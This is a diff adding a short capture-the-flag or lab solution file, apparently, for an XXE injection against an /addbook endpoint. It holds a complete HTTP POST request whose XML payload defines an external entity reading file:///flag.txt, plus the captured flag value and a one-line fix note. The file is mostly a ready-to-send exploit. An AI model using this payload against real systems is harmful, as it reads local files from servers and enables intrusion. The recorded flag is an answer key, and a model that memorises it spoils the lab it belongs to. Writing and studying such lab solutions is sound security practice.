@@ -1,0 +1,10 @@
+# XXE injection via xml POST param. Reads /flag.txt. Returns flag{71ecc5af-ad20-40ec-8733-50b0a19f705c}. Fix: disable external entity processing in XML parser.
+
+POST /addbook HTTP/1.1
+Host: 172.17.0.1:37911
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 185
+
+xml=<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
+<Book><Title>&xxe;</Title><ISBN>123</ISBN><Editor>J</Editor><Publisher>P</Publisher><Chapters/></Book>
